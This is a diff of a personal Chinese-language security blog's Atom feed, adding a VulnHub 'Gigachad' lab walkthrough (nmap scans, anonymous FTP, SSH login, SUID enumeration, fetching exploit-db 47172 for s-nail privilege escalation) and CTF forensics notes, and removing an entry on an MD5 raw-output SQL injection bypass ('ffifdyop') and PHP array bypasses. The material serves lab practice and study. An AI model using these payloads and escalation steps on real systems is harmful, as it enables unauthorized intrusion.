@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Ro1ing.github.io</id>
     <title>Ro1ing</title>
-    <updated>2021-06-08T12:36:19.797Z</updated>
+    <updated>2021-07-15T06:30:25.175Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Ro1ing.github.io"/>
     <link rel="self" href="https://Ro1ing.github.io/atom.xml"/>
@@ -10,6 +10,143 @@
     <logo>https://Ro1ing.github.io/images/avatar.png</logo>
     <icon>https://Ro1ing.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Ro1ing</rights>
+    <entry>
+        <title type="html"><![CDATA[vulnhub-Gigachad靶场复现]]></title>
+        <id>https://Ro1ing.github.io/post/vulnhub-gigachad-ba-chang-fu-xian/</id>
+        <link href="https://Ro1ing.github.io/post/vulnhub-gigachad-ba-chang-fu-xian/">
+        </link>
+        <updated>2021-06-14T10:00:41.000Z</updated>
+        <summary type="html"><![CDATA[<p>靶机地址：http://www.vulnhub.com/entry/gigachad-1,657/</p>
+<p>一、虚拟机无法分配IP处理办法</p>
+<ol>
+<li>进入下面界面按 e<br>
+<img src="https://Ro1ing.github.io/post-images/1623664911466.png" alt="" loading="lazy"></li>
+<li>修改此处<br>
+<img src="https://Ro1ing.github.io/post-images/1623664996553.png" alt="" loading="lazy"><br>
+修改成<br>
+<img src="https://Ro1ing.github.io/post-images/1623665023598.png" alt="" loading="lazy"></li>
+<li>然后按F10重启<br>
+Linux忘记密码的操作</li>
+</ol>
+]]></summary>
+        <content type="html"><![CDATA[<p>靶机地址：http://www.vulnhub.com/entry/gigachad-1,657/</p>
+<p>一、虚拟机无法分配IP处理办法</p>
+<ol>
+<li>进入下面界面按 e<br>
+<img src="https://Ro1ing.github.io/post-images/1623664911466.png" alt="" loading="lazy"></li>
+<li>修改此处<br>
+<img src="https://Ro1ing.github.io/post-images/1623664996553.png" alt="" loading="lazy"><br>
+修改成<br>
+<img src="https://Ro1ing.github.io/post-images/1623665023598.png" alt="" loading="lazy"></li>
+<li>然后按F10重启<br>
+Linux忘记密码的操作</li>
+</ol>
+<!-- more -->
+<p>这样就可以直接进入root权限了<br>
+4. <code>ip add</code>查看状态<br>
+<img src="https://Ro1ing.github.io/post-images/1623665133009.png" alt="" loading="lazy"><br>
+5. 编辑网卡接口<code>vi /etc/network/interfaces</code>修改配置文件</p>
+<pre><code>allow-hotplug ens32
+iface ens32 inet dhcp
+</code></pre>
+<p>原:<br>
+<img src="https://Ro1ing.github.io/post-images/1623665218984.png" alt="" loading="lazy"><br>
+修改后：<br>
+<img src="https://Ro1ing.github.io/post-images/1623665222117.png" alt="" loading="lazy"><br>
+6. 重启网络服务<br>
+<code>/etc/init.d/networking restart</code><br>
+再次输入ip address<br>
+可以看到 重新分配了ip<br>
+<img src="https://Ro1ing.github.io/post-images/1623665263421.png" alt="" loading="lazy"><br>
+重启开始复现</p>
+<p>二、复现</p>
+<ol>
+<li>探测靶机ip地址，使用nmap快速扫描C段<br>
+<code>nmap -sn -v -n - PE 192.168.0.0/24 --min-rate=2000</code></li>
+</ol>
+<blockquote>
+<p>-sn:只做ping扫描，不做端口扫描<br>
+-v：增加输出的详细程度<br>
+-n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析<br>
+-PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现</p>
+</blockquote>
+<p>得到靶机ip<br>
+<img src="https://Ro1ing.github.io/post-images/1623665318241.png" alt="" loading="lazy"><br>
+arp-scan同理<br>
+<img src="https://Ro1ing.github.io/post-images/1623665334887.png" alt="" loading="lazy"><br>
+2. 端口探测<br>
+<code>nmap -sC -sV -p- -n -vv 192.168.0.103 --min-rate=2000</code></p>
+<blockquote>
+<p>-sC不知道是啥<br>
+-sV:探测开放的端口的系统/服务信息<br>
+-p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9<br>
+-n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析</p>
+</blockquote>
+<p><img src="https://Ro1ing.github.io/post-images/1623665355802.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1623665377962.png" alt="" loading="lazy"></p>
+<h2 id="访问网页源代码末尾有加密">访问网页，源代码末尾有加密</h2>
+<blockquote>
+<p>A7F9B77C16A3AA80DAA4E378659226F628326A95<br>
+D82D10564866FD9B201941BCC6C94022196F8EE8<br>
+<img src="https://Ro1ing.github.io/post-images/1623665886404.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1623665890808.png" alt="" loading="lazy"><br>
+啊这</p>
+</blockquote>
+<h2 id="访问目录">访问目录</h2>
+<p><img src="https://Ro1ing.github.io/post-images/1623665909843.png" alt="" loading="lazy"><br>
+没有东西<br>
+查看之前查询到的 robots.txt<br>
+<code>User-agent: * Disallow: /kingchad.html</code><br>
+访问html得到一张没用的图片</p>
+<h2 id="尝试利用ftp-syst">尝试利用ftp-syst</h2>
+<p>ftp匿名(Anonymous)</p>
+<p>xftp 新建会话连</p>
+<blockquote>
+<p>FTP的匿名登录一般有三种：<br>
+1、 用户名：anonymous 密码：Email或者为空<br>
+2、 用户名：FTP 密码：FTP或者为空<br>
+3、 用户名：USER 密码：pass<br>
+<img src="https://Ro1ing.github.io/post-images/1623665990593.png" alt="" loading="lazy"><br>
+可以访问获取一个文件<br>
+文件类型rar<br>
+<img src="https://Ro1ing.github.io/post-images/1623666028700.png" alt="" loading="lazy"><br>
+访问/drippinchad.png<br>
+<img src="https://Ro1ing.github.io/post-images/1623666054489.png" alt="" loading="lazy"><br>
+谷歌识图<br>
+<img src="https://Ro1ing.github.io/post-images/1623666081039.png" alt="" loading="lazy"><br>
+maiden's tower</p>
+</blockquote>
+<p>ssh 连接 用户名chad 密码maidenstower<br>
+<img src="https://Ro1ing.github.io/post-images/1623666104005.png" alt="" loading="lazy"><br>
+<strong>拿到低权限的shell后经常做的几件事：</strong><br>
+1、看系统发行版本 lsb_release -a<br>
+2、查看内核版本 uname -a<br>
+3、当前用户权限<br>
+4、列举suid文件(找到高权限执行的程序) find / -perm -u=s 2&gt;/dev/null<br>
+5、查看已经安装的包、运行的服务，过期版本可能会存在漏洞</p>
+<p><img src="https://Ro1ing.github.io/post-images/1623666135812.png" alt="" loading="lazy"><br>
+这个系统版本没有exp<br>
+<img src="https://Ro1ing.github.io/post-images/1623666154979.png" alt="" loading="lazy"><br>
+查看设置suid程序</p>
+<p>发现s-nail<br>
+<img src="https://Ro1ing.github.io/post-images/1623666210021.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1623666223562.png" alt="" loading="lazy"><br>
+发现可利用exp<br>
+exploit-db 找漏洞EXP<br>
+https://www.exploit-db.com/exploits/47172</p>
+<p>在把靶机中<br>
+下载 EXP 命令：<br>
+<code>wget https://www.exploit-db.com/download/47172</code><br>
+修改脚本去掉无用回车符号<br>
+<code>sed -i &quot;s/\r//&quot; 47172</code><br>
+提权 提为可执行命令<br>
+<img src="https://Ro1ing.github.io/post-images/1623666257881.png" alt="" loading="lazy"><br>
+执行exp<br>
+<img src="https://Ro1ing.github.io/post-images/1623666277828.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1623666293931.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1623666306643.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[CTFshow Web入门 爆破篇]]></title>
         <id>https://Ro1ing.github.io/post/ctfshow-web-ru-men-bao-po/</id>
@@ -853,6 +990,20 @@ vim查看另外一个<br>
 <img src="https://Ro1ing.github.io/post-images/1622377820172.png" alt="" loading="lazy"><br>
 还说要用NTFS<br>
 我靠 我什么都没扫出来 原来是360解压直接把NTFS解密出来了</p>
+<h2 id="guet-ctf2019soul-sipse">[GUET-CTF2019]soul sipse</h2>
+<p>电流声<br>
+进audacity也没啥能看出来的<br>
+<code>steghide extract -sf out.wav</code><br>
+没有密码得到微云链接<br>
+https://share.weiyun.com/5wVTIN3<br>
+打不开的png<br>
+修改 错误的文件头<br>
+得到<code>\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</code><br>
+<img src="https://Ro1ing.github.io/post-images/1623292546520.png" alt="" loading="lazy"><br>
+flag{5304}</p>
+<h2 id="hdctf2019你能发现什么蛛丝马迹吗">[HDCTF2019]你能发现什么蛛丝马迹吗</h2>
+<p>volatility 对其进行内存分析<br>
+https://www.fuzzer.xyz/2019/05/27/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%9D%E6%8E%A2/</p>
 ]]></content>
     </entry>
     <entry>
@@ -955,47 +1106,6 @@ utf8?</p>
         <content type="html"><![CDATA[<p>感觉 有东西压缩在里面 foremost分离</p>
 <p>解压出一个 里面都是出题人.jpg</p>
 <p>16进制查看是 视频格式 扫码得到 一点都不Easy😅</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[BJDCTF2020]Easy MD5]]></title>
-        <id>https://Ro1ing.github.io/post/bjdctf2020easy-md5/</id>
-        <link href="https://Ro1ing.github.io/post/bjdctf2020easy-md5/">
-        </link>
-        <updated>2021-01-30T06:43:16.000Z</updated>
-        <content type="html"><![CDATA[<p>抓包发现 Hint</p>
-<blockquote>
-<p>select * from 'admin' where password=md5($pass,true)</p>
-</blockquote>
-<p>直接提交 <strong>ffifdyop</strong></p>
-<p><strong>md5()函数</strong>有两个参数</p>
-<p><strong>参数一</strong>是要加密的字符串；</p>
-<p><strong>参数二</strong>是输出格式：为true时，表示输出原始16字符二进制格式；默认为false，表示输出32字符十六进制数。</p>
-<p>所以要通过注入</p>
-<p>如何闭合sql语句？找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接 成 ‘ or’ 的形式绕过</p>
-<p>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c</p>
-<p>而这个字符串的前几位是 ‘or' 6</p>
-<p>Mysql 刚好又会吧 hex 转成 ascii 解释，</p>
-<p>因此拼接之后的形式是</p>
-<blockquote>
-<p>1select * from 'admin' where password='' or '6xxxxx'</p>
-</blockquote>
-<p><img src="image-20200519221047710.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611989034103.png" alt="" loading="lazy"><br>
-查看源代码</p>
-<p><img src="image-20200519221054813.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611989037550.png" alt="" loading="lazy"><br>
-?a=s155964671a&amp;b=s1091221200a</p>
-<p>md5碰撞：<strong>md5码不同但是表示的数字可能相同</strong>，故有md5碰撞导致可能会有安全问题</p>
-<p><img src="image-20200519221132965.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611989042033.png" alt="" loading="lazy"><br>
-后来看发现这一步不用这么复杂</p>
-<p>数组绕过：</p>
-<p>?a[]=1&amp;b[]=2即可</p>
-<p>拓展：</p>
-<p>’ffifdyop：’129581926211651571912466741651878684928’<br>
-ffifdyop：T0Do#’<strong>or’8</strong><br>
-129581926211651571912466741651878684928：<strong>’or’6</strong>]!r,b</p>
 ]]></content>
     </entry>
 </feed>
